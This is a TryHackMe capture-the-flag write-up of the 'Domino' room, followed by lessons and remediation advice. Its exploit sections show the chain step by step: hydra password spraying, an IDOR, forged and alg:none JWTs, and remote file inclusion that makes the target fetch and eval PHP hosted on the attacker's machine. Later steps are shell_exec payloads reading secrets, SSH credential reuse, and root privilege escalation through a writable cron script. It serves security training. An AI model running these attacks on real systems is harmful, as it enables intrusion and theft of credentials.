# Domino Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Domino](https://tryhackme.com/room/domino)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup documents the exploitation chain used to complete the room, but no live flag values are shown.
>
> **Please note:** The IP addresses used during testing were allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
>
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as credentials, hashes, tokens, secrets, user-specific values or other challenge-sensitive material.
>: `THM{....}` - a redacted TryHackMe flag value.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques.
>
> To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

**Confirmed lab details used during testing:**

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Provisioned hostname: nexuscorp.local
Attacker working directory: /tmp/VK
```

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on, browser-based and VPN-accessible labs across penetration testing, networking, web application security, privilege escalation, Active Directory and defensive security. Its rooms provide controlled and authorised environments where learners can practise realistic attack paths without targeting real-world systems.

This writeup documents the **Domino** challenge from the **Jr Penetration Tester** pathway. The room focuses on chaining several smaller weaknesses together until they produce full compromise. The key theme is that no single issue needs to be spectacular on its own; the danger comes from how each weakness knocks over the next.

## Lab Summary

The objective of this challenge was to compromise the NexusCorp Employee Portal and retrieve five flags from different stages of the attack chain.

The successful route involved:

1. Confirming hostname resolution through `/etc/hosts`.
2. Enumerating exposed services and identifying SSH and HTTP.
3. Discovering public web content, backup files and API routes.
4. Extracting an encrypted configuration backup.
5. Recovering application metadata from the decrypted configuration.
6. Building a username list from public application content.
7. Identifying a valid low-privilege portal login.
8. Abusing an IDOR in the user profile API to view another user's profile notes.
9. Requesting a JWT from the authenticated API.
10. Modifying JWT claims to access the admin panel.
11. Using an unsigned admin JWT against the file API.
12. Reading application source code through the file API.
13. Discovering a remote file inclusion weakness that evaluated attacker-supplied PHP.
14. Hosting a PHP payload from the Kali VM and achieving remote code execution.
15. Reading the third flag from the server.
16. Extracting application credentials from local source files.
17. Reusing credentials to SSH as the `devops` system user.
18. Reading the user flag from the `devops` home directory.
19. Finding a writable monitoring script executed by root.
20. Abusing the root-executed script to retrieve the final flag.

No real-world systems were targeted. All testing was performed inside the TryHackMe lab environment.

## Tools Used

The main tools used were:

- `nmap` for service enumeration.
- `rustscan` for fast TCP port confirmation.
- `feroxbuster` for web content discovery.
- `curl` for HTTP interaction, session handling and API testing.
- `hydra` for controlled password testing against the portal login.
- `hashcat` for JWT secret testing.
- `python3` for lightweight scripting and hosting payloads.
- `pycryptodome` for AES decryption.
- `ssh` for lateral movement to the Linux user.
- Standard Linux utilities such as `cat`, `grep`, `find`, `ls`, `tail`, `stat`, `echo`, `printf` and `chmod`.

## Initial Enumeration

### Hostname Preparation

The room used the hostname `nexuscorp.local`, so the target IP was mapped locally before web testing:

```bash
echo "<TARGET_IP> nexuscorp.local" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts nexuscorp.local
```

The VPN route and local tunnel interface were also checked:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

This confirmed that traffic to the target was routed through `tun0` using the Kali VPN address `<TUN0_IP>`.

> [!TIP]
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe web challenges. Many rooms rely on hostname-based routing, virtual hosts, cookies, redirects or application logic that will not behave correctly if the hostname is missing. Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on. A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

### Port and Service Enumeration

A fast scan confirmed the main open services:

```bash
rustscan -b 500 -a nexuscorp.local --top -- -sC -sV -Pn
```

The important open ports were:

```text
22/tcp open ssh
80/tcp open http
```

A full TCP scan confirmed that only SSH and HTTP were exposed:

```bash
nmap -sS -T4 -p- <TARGET_IP> -g443
```

The HTTP service identified itself as an Apache-hosted NexusCorp Portal:

```text
80/tcp open http Apache httpd
http-title: NexusCorp Portal
```

### Web Content Discovery

Web enumeration was performed with `feroxbuster`:

```bash
feroxbuster -u http://nexuscorp.local \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

Useful findings included:

```text
/index.php
/team.php
/forgot.php
/reset.php
/dashboard.php
/support/
/admin/
/api/
/api/login.php
/api/reset.php
/api/files.php
/api/auth/token.php
/api/users/profile.php
/backup/README.txt
/backup/config.enc
/static/app.js
```

The exposed backup route was particularly important. The backup readme described an encrypted application configuration file:

```text
config.enc - Encrypted application configuration
Decryption key reference: see static/app.js
```

The JavaScript file contained a deployment note referencing the backup decryption key. The actual key value has been redacted from this public writeup.

```bash
curl -s http://nexuscorp.local/static/app.js
```

The encrypted backup was downloaded for local analysis:

```bash
wget http://nexuscorp.local/backup/config.enc
```

### Backup Configuration Decryption

The encrypted backup used AES-128-ECB. A small Python script was used to decrypt it locally.

```python
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = b"<REDACTED>"

data = Path("config.enc").read_bytes()
plain = AES.new(KEY, AES.MODE_ECB).decrypt(data)

try:
    plain = unpad(plain, AES.block_size)
except ValueError:
    plain = plain.rstrip(b"\x00")

Path("config.dec").write_bytes(plain)
print(plain.decode("utf-8", errors="replace"))
```

The decrypted configuration revealed application metadata and identified a local system user:

```json
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "<REDACTED>"
}
```

This was not directly exploitable at this point, but it became important later during lateral movement.

### Username Collection

The public team page exposed employee email addresses. These were converted into usernames and stored locally for later testing:

```text
<REDACTED>@nexus.corp
<REDACTED>@nexus.corp
<REDACTED>@nexus.corp
```

The derived usernames were saved into `users.txt`:

```text
<REDACTED>
<REDACTED>
<REDACTED>
```

## Exploits

### Portal Login Testing

The portal login was tested using the username list and a common credentials wordlist:

```bash
hydra -L users.txt \
  -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
  nexuscorp.local \
  http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' \
  -I
```

This identified a valid low-privilege portal login:

```text
<REDACTED> : <REDACTED>
```

The credentials were then used to create an authenticated session:

```bash
curl -i -s -c cookies.txt \
  -d 'username=<REDACTED>&password=<REDACTED>' \
  http://nexuscorp.local/index.php
```

The returned session cookie identified the authenticated user as a normal user account. The cookie value has been redacted.

### IDOR in the Profile API

After logging in, the dashboard exposed a profile API endpoint:

```text
/api/users/profile.php?id=<REDACTED>
```

The important issue was that the API accepted a user-controlled `id` parameter. Changing the ID allowed access to another user's profile data:

```bash
curl -s -b cookies.txt \
  'http://nexuscorp.local/api/users/profile.php?id=<REDACTED>'
```

The response returned an admin user's profile, including profile notes:

```json
{
  "id": "<REDACTED>",
  "username": "<REDACTED>",
  "email": "<REDACTED>",
  "role": "admin",
  "notes": "THM{....}"
}
```

This confirmed an insecure direct object reference. The application allowed a low-privilege user to request another user's profile by changing a numeric identifier.

### JWT Retrieval

The dashboard also referenced a file API that required JWT authentication:

```text
/api/files.php?name=
/api/auth/token.php
```

A JWT was requested using the authenticated session cookie:

```bash
curl -s -b cookies.txt http://nexuscorp.local/api/auth/token.php
```

The token payload decoded to a normal user role:

```json
{
  "sub": "<REDACTED>",
  "role": "user",
  "iat": "<REDACTED>",
  "exp": "<REDACTED>"
}
```

### Admin Panel Access Through JWT Claim Manipulation

The JWT payload was modified locally so that the `role` claim became `admin`. The resulting token used a deliberately invalid signature:

```python
import base64
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "<REDACTED>",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64url(json.dumps(payload, separators=(",", ":")).encode())
    + ".<REDACTED>"
)

print(token)
```

The forged token was accepted by the admin panel:

```bash
curl -s -b cookies.txt \
  -H "Authorization: Bearer <REDACTED>" \
  http://nexuscorp.local/admin/
```

The admin panel displayed the second flag:

```text
THM{....}
```

This demonstrated inconsistent or incomplete JWT validation in the admin panel. The token claims were trusted even though the signature was not valid.

### File API Token Behaviour

The file API behaved differently from the admin panel. A forged HS256 token with an invalid signature did not work consistently against the file API. However, an unsigned JWT using `alg: none` was accepted:

```python
import base64
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "<REDACTED>",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64url(json.dumps(payload, separators=(",", ":")).encode())
    + "."
)

with open("admin_none.jwt", "w") as f:
    f.write(token + "\n")
```

This token moved the file API past authentication and role checks.

### Reading Application Source Code

The file API allowed absolute paths inside the web root. This was used to read its own source code:

```bash
NONE_TOKEN=$(cat admin_none.jwt)

curl -s \
  -H "Authorization: Bearer $NONE_TOKEN" \
  'http://nexuscorp.local/api/files.php?name=/var/www/html/api/files.php'
```

The source code revealed the critical vulnerability:

```php
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

This meant that if the `name` parameter pointed to a remote PHP file, the server would fetch it and execute it with `eval()`. That turned the file API into a remote file inclusion to remote code execution path.

### Remote Code Execution

A PHP payload was created on the Kali VM to read the third flag from `/opt/flag3.txt`:

```bash
cat > rce.php <<'PHP'
<?php
echo file_get_contents('/opt/flag3.txt');
?>
PHP
```

A Python web server was started from the attacker working directory:

```bash
python3 -m http.server 8000
```

The target was then instructed to fetch and execute the remote PHP file from the Kali VPN address:

```bash
curl -s \
  -H "Authorization: Bearer $NONE_TOKEN" \
  'http://nexuscorp.local/api/files.php?name=http://<TUN0_IP>:8000/rce.php'
```

The response returned the third flag:

```json
{
  "output": "THM{....}\n"
}
```

### Command Execution as the Web Server User

A second payload was used to confirm command execution context:

```bash
cat > whoami.php <<'PHP'
<?php
echo shell_exec('id; whoami; pwd');
?>
PHP
```

Triggered through the file API:

```bash
curl -s \
  -H "Authorization: Bearer $NONE_TOKEN" \
  'http://nexuscorp.local/api/files.php?name=http://<TUN0_IP>:8000/whoami.php'
```

The output showed that code execution was running as the web server user:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
/var/www/html/api
```

### Local Enumeration and Source Disclosure

The `devops` home directory existed but was not readable by `www-data`:

```text
/home/<REDACTED>
Permission denied
```

Application source files were then read from the web root. The authentication and configuration files disclosed database credentials, application secrets and JWT configuration:

```bash
cat > read_auth.php <<'PHP'
<?php
echo shell_exec('cat /var/www/html/auth.php 2>&1; echo "\n--- config.php ---"; cat /var/www/html/config.php 2>&1');
?>
PHP
```

The recovered configuration included a reusable credential candidate:

```text
DB_USER = <REDACTED>
DB_PASS = <REDACTED>
JWT_SECRET = <REDACTED>
APP_SECRET = <REDACTED>
```

### Lateral Movement to the DevOps User

The earlier decrypted backup had identified a local system user. The disclosed application password was then tested against SSH for that user:

```bash
ssh <REDACTED>@<TARGET_IP>
```

The password was reused, allowing a successful SSH login as the local `devops` user.

The user flag was found in the home directory:

```bash
cat user.txt
```

Public redacted result:

```text
THM{....}
```

### Privilege Escalation Enumeration

The `devops` user could not run commands through sudo:

```bash
sudo -l
```

Result:

```text
Sorry, user <REDACTED> may not run sudo on <REDACTED>.
```

SUID binaries were checked:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Only standard system binaries were found.

Linux capabilities were checked:

```bash
getcap -r / 2>/dev/null
```

No directly exploitable custom capability path was identified.

Writable files were then enumerated:

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/dev|^/run|^/tmp'
```

This revealed a writable monitoring script:

```text
/opt/monitoring/health_report.sh
```

The script was owned by root and group-writable by `devops`:

```text
-rwxrwxr-- 1 root devops /opt/monitoring/health_report.sh
```

### Root-Executed Monitoring Script

The script wrote regular health-check entries to `/var/log/nexus_health.log`. The log showed it was running every minute:

```text
Health check started
Apache: OK
MySQL: OK
Disk: <REDACTED>
```

A harmless test line was appended to confirm the execution context:

```bash
cp /opt/monitoring/health_report.sh /tmp/health_report.sh.bak

printf '\necho "PRIVESC_TEST: $(date) $(id)" >> /tmp/health_privesc_test\n' \
  >> /opt/monitoring/health_report.sh
```

The resulting output confirmed the script was executed by root:

```text
PRIVESC_TEST: <REDACTED> uid=0(root) gid=0(root) groups=0(root)
```

The script was then used to copy the root flag into a readable location:

```bash
printf '\ncat /root/root.txt > /tmp/root_flag\nchmod 644 /tmp/root_flag\n' \
  >> /opt/monitoring/health_report.sh
```

After the next scheduled run, the root flag was readable:

```bash
cat /tmp/root_flag
```

Public redacted result:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. Hostname resolution was required for the web application.
The target was mapped to `nexuscorp.local` through `/etc/hosts`. This mattered because the portal relied on the correct hostname for normal browser and API behaviour. In TryHackMe labs using custom hostnames, skipping this step can cause misleading errors, broken redirects or missing routes.

### 2. Initial enumeration exposed SSH and HTTP only.
Port scanning showed a narrow external surface: SSH on port `22` and HTTP on port `80`. The HTTP service hosted the NexusCorp Employee Portal. This made web enumeration the primary path forward.

### 3. Web discovery exposed backup and API routes.
Content discovery revealed several useful routes, including authentication endpoints, profile APIs, a file API, an admin path and a backup directory. The backup directory contained an encrypted configuration file and a readme pointing to a JavaScript deployment note for the decryption key.

### 4. The encrypted backup revealed the intended local system user.
After extracting the AES key reference from the static JavaScript file, the encrypted backup was decrypted locally. It did not immediately provide shell access, but it identified the local system user that later became the lateral movement target.

### 5. Public team information supported username generation.
The public team page exposed employee email addresses. These were converted into usernames and used for controlled password testing against the portal login. One low-privilege account was recovered.

### 6. A low-privilege portal account exposed an IDOR.
The authenticated dashboard linked to a profile API containing a numeric user ID. Changing the ID parameter allowed access to another user's profile data. This returned the admin user's notes and the first flag.

### 7. JWT claim manipulation exposed the admin panel.
The application issued a JWT for the authenticated user. The role claim was modified from `user` to `admin`, and the admin panel accepted the modified token even though the signature was not valid. This exposed the second flag.

### 8. An unsigned JWT bypassed the file API role check.
The file API required an admin JWT. A token using `alg: none` and an admin role was accepted, allowing access to file API functionality that was not available to a normal user.

### 9. Source disclosure revealed remote file inclusion to RCE.
Using the file API to read its own source code exposed a remote file inclusion branch. If the `name` parameter began with `http://` or `https://`, the server fetched the remote content and executed it with `eval()`. This created a direct path to remote code execution.

### 10. A Kali-hosted PHP payload retrieved the RCE flag.
A small PHP payload was hosted from the Kali VM using Python's HTTP server. The target fetched and executed the payload through the vulnerable file API, allowing `/opt/flag3.txt` to be read.

### 11. Application source disclosure exposed reusable credentials.
Further command execution allowed local source files to be read from the web root. Configuration files disclosed application credentials and secrets. One password was reused for the local system user identified earlier in the decrypted backup.

### 12. SSH access as the DevOps user exposed the user flag.
The reused credential allowed SSH access as the `devops` user. The fourth flag was found in the user's home directory.

### 13. Writable root-executed monitoring created privilege escalation.
Local enumeration showed that `devops` could write to `/opt/monitoring/health_report.sh`. The health log proved the script was being executed every minute, and a test line confirmed it ran as root. Appending a command to copy `/root/root.txt` into `/tmp` exposed the final flag.

## Key Lessons

- ### Small weaknesses become serious when chained.
  The room demonstrates why apparently minor findings should not be dismissed. A backup file, a JavaScript comment, an IDOR, weak JWT handling, source disclosure, credential reuse and a writable monitoring script became a full compromise when chained together.

- ### Hostname resolution matters in web labs.
  The `/etc/hosts` entry was not just housekeeping. Correct name resolution allowed the application to behave as intended. For self-managed Kali VMs connected to TryHackMe through OpenVPN, maintaining a clean and accurate hosts file is part of the workflow.

- ### Public information can support authentication attacks.
  The public team page provided enough information to build a username list. Even when credentials are not directly exposed, predictable usernames and weak passwords can create the first authenticated foothold.

- ### IDOR vulnerabilities are access-control failures.
  The profile API trusted a user-supplied ID instead of enforcing ownership server-side. Access control should be based on the authenticated identity, not on client-controlled parameters.

- ### JWTs must be verified consistently.
  The application treated JWTs inconsistently across components. One route accepted a modified token with an invalid signature, while another accepted an unsigned `alg: none` token. JWT validation must enforce allowed algorithms, signature verification, expiry checks and expected claims everywhere.

- ### File APIs are high-risk functionality.
  Any feature that reads files by path should be treated as sensitive. The file API attempted path validation, but the remote fetch and `eval()` branch was catastrophic. It turned a file viewing feature into server-side code execution.

- ### Never execute remote content with `eval()`.
  Fetching attacker-controlled content and evaluating it as PHP is a direct RCE vulnerability. This is not a sharp edge; it is the whole knife drawer left open.

- ### Credentials should not be stored in readable source files.
  Application credentials and secrets were recoverable from local source code. Secrets should be stored securely, rotated regularly and protected from local disclosure.

- ### Password reuse enables lateral movement.
  The database password was reused for a local system account. This allowed movement from web server code execution as `www-data` to SSH access as `devops`.

- ### Writable scripts executed by root are privilege escalation paths.
  The final escalation came from a group-writable script owned and executed by root. Scheduled scripts must have strict ownership and permissions, especially if they run with elevated privileges.

## Remediation Notes

- ### Harden hostname and deployment assumptions.
  Applications should not rely on fragile deployment assumptions or expose sensitive deployment notes through static files. Comments in client-side JavaScript should not reveal secrets, key references or operational shortcuts.

- ### Remove exposed backups from the web root.
  Backup files should never be placed under a web-accessible directory. If backups are required, they should be stored outside the document root, encrypted with strong key management and access-controlled at the server or storage layer.

- ### Enforce server-side access control.
  Profile APIs should derive the requested user context from the authenticated session unless the caller has a verified administrative role. Direct object references should be protected with object-level authorisation checks.

- ### Improve password policy and monitoring.
  Weak or reused credentials allowed initial access and later lateral movement. Enforce strong password policies, use unique credentials for each account and prefer managed secrets or password vaulting for service credentials.

- ### Validate JWTs securely.
  JWT validation should include:

  - A strict allow-list of accepted algorithms.
  - Rejection of `alg: none`.
  - Mandatory signature verification.
  - Expiry and issuer/audience validation where applicable.
  - Consistent validation logic across all routes.
  - Centralised authentication middleware to avoid route-specific drift.

- ### Remove remote evaluation logic.
  The file API should never fetch and execute remote content. Remove `eval()` entirely. If remote file fetching is genuinely required, responses should be treated as data, restricted to trusted destinations, size-limited and never executed.

- ### Restrict file API scope.
  File reads should use fixed identifiers or an allow-listed directory, not arbitrary user-supplied paths. Use canonical path validation, deny absolute paths unless explicitly required and avoid returning source code.

- ### Protect application secrets.
  Database credentials, application secrets and JWT signing keys should not be stored in readable PHP files where possible. Use environment variables, secret managers or locked-down configuration files with least-privilege permissions.

- ### Prevent credential reuse.
  System accounts, application accounts and database accounts should have separate, unique credentials. A database password should never be valid for SSH.

- ### Lock down scheduled scripts.
  Root-executed scripts should not be writable by non-root users or groups. A safer permission model would be:

  ```text
  root:root
  0755 or stricter
  ```
  
  Scheduled jobs should be reviewed for unsafe writable paths, unquoted variables, relative paths, command injection risk and insecure log handling.

- ### Monitor sensitive changes.
  Security monitoring should alert on:

  - Unexpected modification of scripts under `/opt`, `/usr/local` or cron-related paths.
  - Web server processes fetching remote code.
  - Outbound HTTP requests from server-side application features.
  - Unusual SSH logins using service-related credentials.
  - Access to sensitive files such as `/root/root.txt`, application config files and JWT secrets.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
